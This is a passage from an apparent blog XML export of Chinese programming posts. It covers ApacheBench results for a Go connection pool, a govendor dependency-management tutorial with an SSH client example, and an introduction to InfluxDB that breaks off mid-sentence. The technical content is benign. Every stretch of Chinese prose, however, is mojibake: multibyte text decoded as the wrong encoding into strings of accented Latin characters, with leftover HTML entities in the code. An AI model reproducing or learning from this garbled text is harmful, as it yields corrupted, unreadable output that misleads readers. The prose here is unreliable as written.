Receive: 0, Length: 928, Exceptions: 0)Total transferred: 114144 bytesHTML transferred: 6496 bytesRequests per second: 1201.65 [#/sec] (mean)Time per request: 83.219 [ms] (mean)Time per request: 0.832 [ms] (mean, across all concurrent requests)Transfer rate: 133.95 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 4 4.6 2 18Processing: 8 79 107.2 47 489Waiting: 0 71 107.9 40 488Total: 12 82 106.4 49 491Percentage of the requests served within a certain time (ms) 50% 49 66% 59 75% 67 80% 80 90% 159 95% 394 98% 450 99% 479 100% 491 (longest request) å»é™¤è¿æ¥æ± çš„è®¾ç½®åçš„æµ‹è¯•ç»“æœ:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455âœ ~ ab -c 100 -n 1000 'http://localhost:9090/pool'This is ApacheBench, Version 2.3 &lt;$Revision: 1706008 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/Licensed to The Apache Software Foundation, http://www.apache.org/Benchmarking localhost (be patient)Completed 100 requestsCompleted 200 requestsCompleted 300 requestsCompleted 400 requestsCompleted 500 requestsCompleted 600 requestsCompleted 700 requestsCompleted 800 requestsCompleted 900 requestsCompleted 1000 requestsFinished 1000 requestsServer Software:Server Hostname: localhostServer Port: 9090Document Path: /poolDocument Length: 0 bytesConcurrency Level: 100Time taken for tests: 1.467 secondsComplete requests: 1000Failed requests: 938 (Connect: 0, Receive: 0, Length: 938, Exceptions: 0)Total transferred: 115374 bytesHTML transferred: 6566 bytesRequests per second: 681.83 [#/sec] (mean)Time per request: 146.664 [ms] (mean)Time per request: 1.467 [ms] (mean, across all concurrent requests)Transfer rate: 76.82 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 1 1.7 1 19Processing: 8 139 106.8 109 415Waiting: 0 133 110.7 81 415Total: 10 141 107.4 110 418Percentage of the requests served within a certain time (ms) 50% 110 66% 210 75% 237 80% 250 90% 285 95% 321 98% 378 99% 393 100% 418 (longest request) ç»“è®º åŒæ ·çš„å¹¶å‘æƒ…å†µä¸‹, ä½¿ç”¨è¿æ¥æ± æ¯”æ²¡ä½¿ç”¨å¿«ä¸€å€, åœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥æ›´æ˜æ˜¾ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>go-sql-drive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golangåŒ…ç®¡ç†ä¹‹vendor]]></title>
    <url>%2F2017%2F03%2F13%2Fgolang-pkg-management-tool%2F</url>
    <content type="text"><![CDATA[åœ¨ä½¿ç”¨Golangè¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ªéå¸¸ä»¤äººå¤´å¤§çš„é—®é¢˜: ç¼ºå°‘ä¾èµ–åº“ç‰ˆæœ¬åŠŸèƒ½ç®¡ç†, æ¯”å¦‚æŸäº›ä¾èµ–åœ¨æŸä¸ªcommitä¹‹åå‘ç”Ÿäº†APIå˜æ›´ä¹‹åï¼Œå¦‚æœä¸ä¿®æ”¹ä»£ç å¾ˆéš¾å…¼å®¹ï¼Œç„¶è€Œå¼€å‘è€…ä¹‹é—´å¾ˆæœ‰å¯èƒ½å› ä¸ºå‚ä¸çš„æ—¶é—´ä¸åŒï¼Œå¯¼è‡´æ‰§è¡Œgo getå‘½ä»¤è·å–çš„ç‰ˆæœ¬ä¸åŒï¼Œè€Œå¯¼è‡´å„ç§é—®é¢˜, ç”šè‡³æ˜¯ç¼–è¯‘ä¸é€šè¿‡ã€‚å› æ­¤éœ€è¦æœ‰ä¸€ä¸ªåŒ…ä¾èµ–çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·ã€‚ vendorä¹‹å‰åœ¨vendorå‡ºæ¥ä¹‹å‰, ä»¥godepä¸ºä¸»æ¯”è¾ƒæµè¡Œ, godepçš„åŸç†éå¸¸ç®€å•:godepæŠŠç¬¬ä¸‰åŒ…çš„ç‰ˆæœ¬ä¾èµ–ä¿¡æ¯è®°å½•åœ¨Godeps.jsonä¸‹ï¼Œå¹¶ä¸”æŠŠç¬¬ä¸‰åŒ…å®Œæ•´æ‹·è´ä¸€ä»½åˆ°vendorä¸‹é¢ã€‚é€šè¿‡å¯¹Godeps.jsonæ–‡ä»¶è¿›è¡Œç‰ˆæœ¬ç®¡ç†å³å¯ä»¥ç®¡ç†æ•´ä¸ªé¡¹ç›®çš„ç¬¬ä¸‰æ–¹åŒ…ä¾èµ–ä¿¡æ¯ã€‚ å¯ä»¥çœ‹åˆ°godepåªæ˜¯æŠŠç¬¬ä¸‰æ–¹åŒ…è¿›è¡Œå•ç‹¬åˆ°ä¾èµ–ç®¡ç†ï¼Œè€Œæ–°å¢åˆ°ç¬¬ä¸‰åŒ…è¿˜æ˜¯ä¼šè¢«getåˆ°GOPATHä¸­, å¦‚æœå¤šä¸ªé¡¹ç›®ç”¨åŒä¸€ä¸ªç¬¬ä¸‰åŒ…çš„ä¸åŒç‰ˆæœ¬æ—¶, é‚£å°±å®Œè›‹äº† vendorçš„å†å²vendoræœºåˆ¶å°±æ˜¯ç”¨æ¥è§£å†³ç¬¬ä¸‰æ–¹åŒ…ä¾èµ–é—®é¢˜: golang 1.5å¼•å…¥, é»˜è®¤æ˜¯å…³é—­çš„, é€šè¿‡æ‰‹åŠ¨è®¾ç½®ç¯å¢ƒå˜é‡:GO15VENDOREXPERIMENT=1å¼€å¯ golang 1.6é»˜è®¤å¼€å¯ goalng 1.7 vendorä½œä¸ºåŠŸèƒ½æ”¯æŒ,å–æ¶ˆGO15VENDOREXPERIMENTç¯å¢ƒå˜é‡ vendorçš„åŸç†å¾ˆç®€å•: å°†ç¬¬ä¸‰æ–¹ä¾èµ–æ”¾å…¥å½“å‰é¡¹ç›®vendorç›®å½•ä¸­ï¼Œ ç¼–è¯‘çš„æ—¶å€™ä»vendorç›®å½•ä¸­æŸ¥æ‰¾ä¾èµ–è€Œä¸ä»GOPATH/srcä¸­å¯¹åº”ç›®å½•ä¸­æŸ¥æ‰¾ã€‚æ–°å¢çš„ç¬¬ä¸‰æ–¹åŒ…ç›´æ¥è¢«getåˆ°æ ¹ç›®å½•çš„vendoræ–‡ä»¶å¤¹ä¸‹,ä¸ä¼šä¸å…¶å®ƒçš„é¡¹ç›®æ··ç”¨ç¬¬ä¸‰æ–¹åŒ…ï¼Œå®Œç¾é¿å…å¤šä¸ªé¡¹ç›®åŒç”¨åŒä¸€ä¸ªç¬¬ä¸‰æ–¹åŒ…çš„ä¸åŒç‰ˆæœ¬é—®é¢˜ã€‚å› æ­¤åªéœ€è¦å¯¹vendor/vendor.jsonè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå³å¯å¯¹ç¬¬ä¸‰åŒ…ä¾èµ–å…³ç³»è¿›è¡Œæ§åˆ¶ã€‚ vendorçš„ä½¿ç”¨æƒ³è¦è¯¦ç»†äº†è§£govendorè¯·å‚è€ƒgovendor å®‰è£…govendor 1go get -u -v github.com/kardianos/govendor åˆ›å»ºä¸€ä¸ªgolangçš„é¡¹ç›® æ¯”å¦‚æˆ‘åˆ›å»ºä¸€ä¸ªç®€å•çš„ä¾èµ–sshæœåŠ¡çš„åŒ…1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String()) åˆå§‹åŒ–vendoræ–‡ä»¶ 12345678910111213âœ govendor_test govendor initâœ govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;âœ govendor_test tree ..â”œâ”€â”€ main.goâ””â”€â”€ vendor â””â”€â”€ vendor.json åˆå§‹åŒ–å®Œæˆåä¼šç”Ÿæˆä¸€ä¸ªvendorçš„æ–‡ä»¶å¤¹, å› ä¸ºæˆ‘è¿˜æ²¡æ·»åŠ ä¾èµ–, æ‰€ä»¥vendor.jsoné‡Œé¢å¹¶æ²¡æœ‰ç›¸å…³ä¾èµ–åŒ…çš„æè¿° æ·»åŠ ä¾èµ–çš„ç¬¬ä¸‰æ–¹åŒ… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182âœ govendor_test govendor add +externalâœ govendor_test cat vendor/vendor.json&#123; &quot;comment&quot;: &quot;&quot;, &quot;ignore&quot;: &quot;test&quot;, &quot;package&quot;: [ &#123; &quot;checksumSHA1&quot;: &quot;C1KKOxFoW7/W/NFNpiXK+boguNo=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/curve25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;wGb//LjBPNxYHqk+dcLo7BjPXK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;LXFcVx8I587SnWmKycSDEq9yvK8=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ed25519/internal/edwards25519&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125;, &#123; &quot;checksumSHA1&quot;: &quot;fsrFs762jlaILyqqQImS1GfvIvw=&quot;, &quot;path&quot;: &quot;golang.org/x/crypto/ssh&quot;, &quot;revision&quot;: &quot;453249f01cfeb54c3d549ddb75ff152ca243f9d8&quot;, &quot;revisionTime&quot;: &quot;2017-02-08T20:51:15Z&quot; &#125; ], &quot;rootPath&quot;: &quot;govendor_test&quot;&#125;âœ govendor_test tree ..â”œâ”€â”€ main.goâ””â”€â”€ vendor â”œâ”€â”€ golang.org â”‚ â””â”€â”€ x â”‚ â””â”€â”€ crypto â”‚ â”œâ”€â”€ LICENSE â”‚ â”œâ”€â”€ PATENTS â”‚ â”œâ”€â”€ curve25519 â”‚ â”‚ â”œâ”€â”€ const_amd64.h â”‚ â”‚ â”œâ”€â”€ const_amd64.s â”‚ â”‚ â”œâ”€â”€ cswap_amd64.s â”‚ â”‚ â”œâ”€â”€ curve25519.go â”‚ â”‚ â”œâ”€â”€ doc.go â”‚ â”‚ â”œâ”€â”€ freeze_amd64.s â”‚ â”‚ â”œâ”€â”€ ladderstep_amd64.s â”‚ â”‚ â”œâ”€â”€ mont25519_amd64.go â”‚ â”‚ â”œâ”€â”€ mul_amd64.s â”‚ â”‚ â””â”€â”€ square_amd64.s â”‚ â”œâ”€â”€ ed25519 â”‚ â”‚ â”œâ”€â”€ ed25519.go â”‚ â”‚ â””â”€â”€ internal â”‚ â”‚ â””â”€â”€ edwards25519 â”‚ â”‚ â”œâ”€â”€ const.go â”‚ â”‚ â””â”€â”€ edwards25519.go â”‚ â””â”€â”€ ssh â”‚ â”œâ”€â”€ buffer.go â”‚ â”œâ”€â”€ certs.go â”‚ â”œâ”€â”€ channel.go â”‚ â”œâ”€â”€ cipher.go â”‚ â”œâ”€â”€ client.go â”‚ â”œâ”€â”€ client_auth.go â”‚ â”œâ”€â”€ common.go â”‚ â”œâ”€â”€ connection.go â”‚ â”œâ”€â”€ doc.go â”‚ â”œâ”€â”€ handshake.go â”‚ â”œâ”€â”€ kex.go â”‚ â”œâ”€â”€ keys.go â”‚ â”œâ”€â”€ mac.go â”‚ â”œâ”€â”€ messages.go â”‚ â”œâ”€â”€ mux.go â”‚ â”œâ”€â”€ server.go â”‚ â”œâ”€â”€ session.go â”‚ â”œâ”€â”€ tcpip.go â”‚ â””â”€â”€ transport.go â””â”€â”€ vendor.json9 directories, 36 files æˆ‘ä»¬å‘ç°vendor.jsonçš„packageå·²ç»è®°å½•äº†ç¬¬ä¸‰æ–¹åŒ…çš„ç‰ˆæœ¬,å¹¶ä¸”æŠŠè¿™äº›ä¾èµ–çš„åŒ…éƒ½æ”¾åˆ°vendorç›®å½•ä¸‹äº† æ ¹æ®è‡ªå·±çš„éœ€æ±‚,é€‰æ‹©æ˜¯å¦å°†vendorç›®å½•åšç‰ˆæœ¬æ§åˆ¶ ä¸€èˆ¬åªéœ€è¦å°†vendor.jsonåšç‰ˆæœ¬æ§åˆ¶å³å¯,ä½†æ˜¯å¯¹äºé‚£äº›éœ€è¦ç¿»å¢™æ‰èƒ½ä¸‹è½½çš„åŒ…ä¹Ÿå¯ä»¥ç›´æ¥å°†vendoréƒ½çº³å…¥ç‰ˆæœ¬æ§åˆ¶æ·»åŠ .ignore.gitä»…å¯¹vendor.jsonåšç‰ˆæœ¬æ§åˆ¶123456git initecho &quot;vendor/golang.or&quot; .gitignoregit add .git commit -m &quot;test commit&quot;git push -u origin master... å…¶ä»–å°ä¼™ä¼´å®‰è£…ä¾èµ– å…¶ä»–å°ä¼™ä¼´å¦‚æœéœ€è¦ä½¿ç”¨è¿™ä¸ªé¡¹ç›®, æ‹‰ä¸‹è¯¥é¡¹ç›®12git clone ssh://git@xxx/govendor_test.githttps_proxy=http://localhost:8123 govendor sync (æˆ‘éœ€è¦å®‰è£…golang.orgçš„åŒ…,å› æ­¤éœ€è¦FQ) è¿™æ ·å°±å®‰è£…äº†è¯¥é¡¹ç›®çš„æŒ‡å®šç‰ˆæœ¬çš„ç¬¬ä¸‰ä¸ªä¾èµ–ã€‚æ¥ä¸‹æ¥æ„‰å¿«çš„ç©è€å§!]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>vendor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ—¶åºæ•°æ®åº“ä¹‹InfluxDB]]></title>
    <url>%2F2017%2F03%2F10%2Fopentsdb-vs-influxdb%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘å…¬å¸ä¸šåŠ¡é‡åº¦ä¾èµ–æ—¶åºæ•°æ®åº“, å…¬å¸ä¸Šä¸ªç‰ˆæœ¬é€‰æ‹©äº†OpenTSDB, åœ¨1-2å¹´å‰ï¼Œä»–çš„ç¡®å¾ˆæµè¡Œã€‚ ä½†æ˜¯åœ¨åšè½¯ä»¶é‡æ„æ—¶, ä¸šåŠ¡å±‚åé¦ˆçš„ä¸€äº›é—®é¢˜, OpenTSDBæš‚æ—¶æ— æ³•è§£å†³,æˆä¸ºäº†ä¸€ä¸ªç—›ç‚¹, è®©æˆ‘éœ€è¦è€ƒè™‘å…¶ä»–æ–¹æ¡ˆ, ç”±äºä¹‹å‰ä½¿ç”¨è¿‡InfluxDB, ä¹Ÿä¸€ç›´åœ¨å…³æ³¨, å®ƒç»™äº†æˆ‘æƒŠè‰³çš„æ„Ÿè§‰,æ‰€ä»¥è®°å¿†çŠ¹æ–°. èƒŒæ™¯ä¹‹å‰åšè¿ç»´æ—¶,é‡åº¦ä½¿ç”¨è¿‡zabbix, å…³ç³»å‹æ•°æ®åº“çš„ä¼˜åŒ–,æ ¹æœ¬æ— æ³•è§£å†³é«˜IO, åé¢åˆä½¿ç”¨è¿‡Graphite, è¿™ä¸ªå®‰è£…åƒè¿·ä¸€æ ·çš„å·¥å…·, å®ƒåç«¯åœ¨RRDä¸Šé¢è®¾è®¡å‡ºäº†ä¸€ä¸ªç®€å•çš„æ—¶åºæ•°æ®åº“, ä½†æ˜¯é…ç½®ç¹æ‚,å®¹é‡å®Œå…¨é è§„åˆ’ã€‚ç›´åˆ°ä½¿ç”¨äº†InfluxDB, éƒ¨ç½²ç®€å•,ä½¿ç”¨æ–¹ä¾¿,é«˜å‹ç¼©, å¯¹å®ƒå°è±¡å¾ˆä¸é”™, ä½†æ˜¯0.12è¿‡åä¸æ”¯æŒé›†ç¾¤ã€‚ ä¹‹å‰InfluxDBåˆ‡æ¢äº†2æ¬¡å­˜å‚¨å¼•æ“(å®ƒçš„å­˜å‚¨æ˜¯æ’ä»¶å¼çš„), ä¹Ÿæ²¡å»äº†è§£è¿‡å®ƒåˆ‡æ¢çš„åŸå› , ç›´åˆ°çœ‹åˆ°InfoQä¸Šä¸ƒç‰›çš„æ¼”è®²ä»InfluxDBçœ‹æ—¶åºæ•°æ®çš„å¤„, ä»–é“å‡ºäº†äº†åŸå› : LevelDBä¸æ”¯æŒçƒ­å¤‡ä»½, influxDBè®¾è®¡çš„shardä¼šæ¶ˆè€—å¤§é‡æ–‡ä»¶æè¿°ç¬¦ï¼Œå°†ç³»ç»Ÿèµ„æºè€—å°½ã€‚ BoltDBè§£å†³äº†çƒ­å¤‡, è§£å†³äº†æ¶ˆè€—å¤§é‡æ–‡ä»¶æè¿°ç¬¦çš„é—®é¢˜, ä½†æ˜¯å¼•å…¥äº†ä¸€ä¸ªæ›´è‡´å‘½çš„é—®é¢˜:å®¹é‡è¾¾åˆ°æ•°GBçº§åˆ«æ—¶,ä¼šäº§ç”Ÿå¤§é‡éšæœºå†™, é€ æˆé«˜IOPSã€‚ æ”¾å¼ƒäº†ä»–ä»¬, åœ¨ä»–ä»¬çš„ç»éªŒä¸Šå¼€å§‹è‡ªå·±å®ç°ä¸€ä¸ªå­˜å‚¨å¼•æ“: TSM(Time-Structured Merge Tree), å®ƒæˆªå–äº†OpenTSDBçš„ä¸€äº›è®¾è®¡ç»éªŒ,æ ¹æ®LSM Treeé’ˆå¯¹æ—¶é—´åºåˆ—æ•°æ®è¿›è¡Œä¼˜åŒ– æˆ‘è®¤ä¸ºåƒè¿™æ ·çš„é’ˆå¯¹ç‰¹æ®Šåœºæ™¯è¿›è¡Œä¼˜åŒ–çš„æ•°æ®åº“ä¼šæ˜¯ä»Šåæ•°æ®åº“é¢†åŸŸå‘å±•çš„ä¸»æµ, å¦ä¸€ä¸ªè¯æ˜å°±æ˜¯EleasticSearchä¸€ä¸ªé’ˆå¯¹æ–‡æœ¬è§£ç´¢è€Œè®¾è®¡çš„æ•°æ®åº“, è™½ç„¶OpenTSDBä¹Ÿé’ˆå¯¹æ—¶åºæ•°æ®åšäº†ä¼˜åŒ–,ä½†æ˜¯ç”±äºå­˜å‚¨ç³»ç»Ÿä¾ç„¶ä¾èµ–HBase, æ‰€ä»¥åŠ›åº¦ä¸Šé¢æ„Ÿè§‰æ²¡InfluxDBç»™åŠ›ã€‚ ç¤¾åŒºä¸€è·¯èµ°æ¥ä¹‹è‰°è¾›,ä½†æ˜¯å´æ¿€æƒ…æ´‹æº¢,ä»–ä»¬æ˜¯å…ˆè¡Œè€…. æˆ‘å¯¹å®ƒé›†ç¾¤çš„é—­æºå¹¶ä¸åæ„Ÿ, è¿™ç¾¤æ¿€æƒ…æ´‹æº¢çš„äººéœ€è¦æœ‰å•†ä¸šæ”¯æŒã€‚ æ—¶åºæ•°æ®åº“çƒ­åº¦æ’åè¿™æ˜¯DB Engineçš„æ—¶åºæ•°æ®åº“2017çš„æ’è¡Œæ¦œ, æˆªå›¾æ˜¯2017-3æœˆçš„ï¼Œæœ€æ–°çš„å¯ä»¥ç‚¹DB-Engines Ranking of Time Series DBMSä¸Šå›¾å¯ä»¥çœ‹å‡ºInfluxDBæœ€è¿‘å¾ˆçƒ­, é¢†å…ˆä¼˜åŠ¿æ˜æ˜¾ä¸‹é¢æ˜¯å¯¹æ¯”InfluxDB, OpenTSDB, Graphiteçš„å˜åŒ–è¶‹åŠ¿ã€‚å¯¹äºä¸€ä¸ªè®¾è®¡ç²¾è‰¯ï¼Œéƒ¨ç½²ç®€å•ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œè€Œä¸”è¿˜é«˜æ€§èƒ½çš„æ—¶åºæ•°æ®åº“è€Œè¨€, æƒ³ä¸çƒ­éƒ½éš¾ã€‚ ç®€ä»‹åŸºäºGoè¯­è¨€å¼€å‘ï¼Œç¤¾åŒºéå¸¸æ´»è·ƒï¼Œé¡¹ç›®æ›´æ–°é€Ÿåº¦å¾ˆå¿«ï¼Œæ—¥æ–°æœˆå¼‚ï¼Œå…³æ³¨åº¦é«˜, 1.0å‘å¸ƒè¿‡å, ç¨³å®šæ€§ä¹Ÿéå¸¸é«˜ã€‚å®˜æ–¹æ˜¯è¿™æ ·ä»‹ç»InfluxDBçš„ï¼š influxdbæ˜¯ä¸€ä¸ªä»åº•å±‚ä¸€æ­¥ä¸€æ­¥æˆé•¿ä¸ºèƒ½å¤„ç†é«˜å†™å…¥,é«˜æŸ¥è¯¢çš„æ—¶åºæ•°æ®åº“, å®ƒä¸“é—¨é’ˆå¯¹æ—¶åºæ•°æ®åšäº†ä¼˜åŒ–,è®©å…¶æ›´é«˜æ€§èƒ½, ä»–å¯ä»¥ç”¨æ¥å­˜å‚¨ä»»ä½•æ—¶åºæ•°æ®, åŒ…æ‹¬DevOpsçš„ç›‘æ§ã€åº”ç”¨æŒ‡æ ‡ã€ç‰©è”ç½‘ä¼ æ„Ÿå™¨çš„æ•°æ®, å¹¶å®æ—¶åˆ†æ è¿™æ˜¯å®ƒgithubä¸Šç»™å‡ºçš„ç‰¹æ€§è¯´æ˜: å†…å»ºHTTP API, æ— éœ€è‡ªå·±å®ç° æ•°æ®é«˜å‹ç¼©, æ”¯æŒéå¸¸çµæ´»çš„æŸ¥è¯¢è®¿é—® æ”¯æŒç±»SQLæŸ¥è¯¢, å­¦ä¹ æˆæœ¬ä½, æ–¹ä¾¿ä½¿ç”¨ å®‰è£…å’Œç®¡ç†éƒ½ååˆ†ç®€å•, æ•°æ®å†™å…¥å’Œè¯»å–çš„é€Ÿåº¦å¿« ä¸ºå®æ—¶æŸ¥è¯¢è€Œç”Ÿ, å¯¹æ¯ä¸€ä¸ªç‚¹ä½éƒ½å»ºç«‹ç´¢å¼•, åŠæ—¶æŸ¥è¯¢å“åº”é€Ÿåº¦å°äº100ms ä¸šåŠ¡é—®é¢˜æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ—¶åºæ•°æ®åº“, ä»–éœ€è¦èƒ½è§£å†³æˆ‘ä»¬ä»¥ä¸‹è¿™äº›é—®é¢˜: ä¸€ä¸ªæµ‹è¯•æŒ‡æ ‡å¤šå€¼ä¸€ä¸ªæŒ‡æ ‡å¾€å¾€æœ‰å¤šä¸ªç»´åº¦æ¥æè¿°å…¶å˜åŒ–çŠ¶æ€,å¹¶ä¸ä»…ä»…æ˜¯å€¼, æ¯”å¦‚å¯¹äºCPUçš„è€Œè¨€, åº”è¯¥æœ‰ä¸­æ–­ï¼Œè´Ÿè½½, ä½¿ç”¨ç‡ç­‰ã€‚ å¤šTagæ”¯æŒtagæ˜¯å¯¹ä¸€ä¸ªæŒ‡æ ‡çš„æè¿°,æ˜¯ä¸€ä¸ªæ ‡ç­¾, åœ¨ä¸šåŠ¡ä¸ŠTagå¯¹äºåˆ†ç»„è¿‡æ»¤éå¸¸æœ‰æ„ä¹‰, ç”¨äºæ ‡ç¤ºä¸€ä¸ªæŒ‡æ ‡åœ¨ä¸šåŠ¡ä¸Šçš„æ„ä¹‰, æ¯”å¦‚å¯¹äºIOTæ¥è¯´, ä¼ æ„Ÿå™¨çš„æŒ‡æ ‡å¾€å¾€æ˜¯ä¸€ä¸ªæ— æ„ä¹‰çš„id, å› æ­¤éœ€æ±‚ç»™å®ƒæ‰“ä¸Šnameæ ‡ç­¾, æ ‡ç¤ºä»–çš„ç‰¹æ®Šæ„ä¹‰, æ‰“ä¸Šè®¾å¤‡ID, æ ‡ç¤ºå®ƒå±äºå“ªä¸ªè®¾å¤‡, æ‰“ä¸Šä½ç½®æ ‡ç­¾, æ ‡ç¤ºè¯¥æŒ‡æ ‡æ¥æºäºå“ªä¸ªåœ°æ–¹ã€‚ åœ¨æŒ‡æ ‡çš„å€¼ä¸Šèƒ½åšä¸€äº›åŸºæœ¬çš„æ¯”è¾ƒè¿ç®—ä½œä¸ºä¸€ä¸ªæ•°æ®åº“,åœ¨åŠŸèƒ½å±‚é¢éœ€è¦è§£å†³ä¸€äº›åŸºæœ¬çš„è¿ç®—, æ¯”å¦‚æ±‚å’Œï¼Œæ±‚æœ€å°ï¼Œæ±‚æœ€å¤§, ä½†è¿™è¿˜ä¸å¤Ÿ, éœ€è¦æ”¯æŒæ¡ä»¶è¿‡æ»¤, æ”¯æŒTagçš„æ¡ä»¶è¿‡æ»¤, æ”¯æŒå€¼çš„æ¡ä»¶è¿‡æ»¤, æ”¯æŒå€¼çš„æ¡ä»¶è¿‡æ»¤æ˜¯å…³é”®, ä¸ç„¶ä¼šäº§ç”Ÿå·¨å¤§çš„æ•°æ®å¤åˆ¶, æ¯”å¦‚æˆ‘ä»¬éœ€è¦è¿‡æ»¤å‡º CPU &gt; 90çš„æœºå™¨, å¦‚æœæ•°æ®åº“ä¸æ”¯æŒ, é‚£ä¹ˆæˆ‘éœ€è¦å°†è¿™äº›æ•°æ®ä»æ•°æ®åº“ä¸­æŸ¥å‡ºæ¥,å¤åˆ¶ç»™æˆ‘çš„ç¨‹åºå¤„ç†ã€‚ è¿™å¸¦æ¥äº†å·¨å¤§çš„é—®é¢˜: 1. æ•°æ®åº“è¦åå‡ºå¦‚æ­¤å¤§é‡çš„æ•°æ®, è´Ÿè½½å‡é«˜, å‡ºå£æµé‡æš´å¢ 2.ç¨‹åºæ‹¿åˆ°å¦‚æ­¤å¤§é‡çš„æ•°æ®, ç»™å¤„ç†æ–¹å¸¦æ¥äº†å·¨å¤§çš„è®¡ç®—å‹åŠ›, å¦‚æœå‰æ®µé‡‡ç”¨Angularæˆ–è€…Reactæ¥å†™, ä¸€ä¸ªè¿è¡Œåœ¨pcä¸Šçš„å°å°çš„æµè§ˆå™¨,æ ¹æœ¬å¤„ç†ä¸äº†ã€‚3. å¤„ç†æ•ˆç‡ä½ï¼Œæ•°æ®çš„å¤„ç†æœ¬è¯¥åœ¨æ•°æ®å­˜å‚¨çš„åœ°æ–¹è¿›è¡Œ, æ¯”å¦‚Hadoop, å®Œå…¨æ²¡å¿…è¦å¤åˆ¶ã€‚ æŒ‡æ ‡è®¡ç®—çš„ä¸­é—´ç»“æœéœ€è¦å­˜ä¼šæŒ‡æ ‡è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„åœºæ™¯, ä½¿ç”¨RDDæ—¶æ›´æ˜¯å¸¸ç”¨,æ¯”å¦‚æ•°æ®æ˜¯æŒ‰ç…§30ç§’å­˜å‚¨çš„ï¼Œä½†æ˜¯æˆ‘éœ€è¦ è¿™æ ·ä¸€ä¸ªèšåˆç»´åº¦ 5m, 15m, 1h, 3h, 12h, ç„¶åæˆ‘å¹³æ—¶åªä½¿ç”¨è¿™äº›ç»´åº¦çš„æ•°æ®, ä¸ç”¨æ¯æ¬¡ä¸´æ—¶è®¡ç®—ã€‚ æ¦‚å¿µä»‹ç»influxDBçš„æ ¸å¿ƒæ¦‚å¿µåŒ…å«: Line Protocol, Retention Policy, Series, Point, Continuous Query. Line ProtocolLine Protocolç”¨äºæè¿°å­˜å…¥æ•°æ®åº“çš„æ•°æ®æ ¼å¼, ä¹Ÿå¯ä»¥è¯´æ˜¯æ•°æ®åè®®, ç›¸æ¯”äºJSONæ ¼å¼ï¼ŒLine Protocolæ— éœ€åºåˆ—åŒ–ï¼Œæ›´åŠ é«˜æ•ˆ, å®˜æ–¹å¯¹å®ƒåšäº†å…¨é¢çš„ä»‹ç»Line Protocol, ä¸‹é¢æ‘˜å–è¯­æ³•éƒ¨åˆ†åšç®€è¦è¯´æ˜ï¼šLine Protocolé‡Œé¢çš„ä¸€è¡Œå°±æ˜¯InfluxDBé‡Œé¢çš„ä¸€ä¸ªç‚¹ä½, ä»–å°†ä¸€ä¸ªç‚¹åˆ†å‰²æˆmeasurement, tag_set, field_set, timestamp4ä¸ªéƒ¨åˆ†, ä¾‹å¦‚:12345678910è¯­æ³•æ ¼å¼: measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]æ —å­:weather,location=us-midwest temperature=82 1465839830100400200 | -------------------- -------------- | | | | | | | | |+-----------+--------+-+---------+-+---------+|measurement|,tag_set| |field_set| |timestamp|+-----------+--------+-+---------+-+---------+ measurement: metric name, éœ€è¦ç›‘æ§çš„æŒ‡æ ‡çš„åç§°, æ¯”å¦‚ä¸Šé¢çš„weather tag_set: ä½¿ç”¨â€,â€ä¸measurementéš”å¼€, è¡¨ç¤ºä¸€ç»„Tagçš„é›†åˆ, ç”¨äºä¿å­˜ç‚¹ä½çš„å…ƒæ•°æ®, ä¸ºå¯é€‰é¡¹, 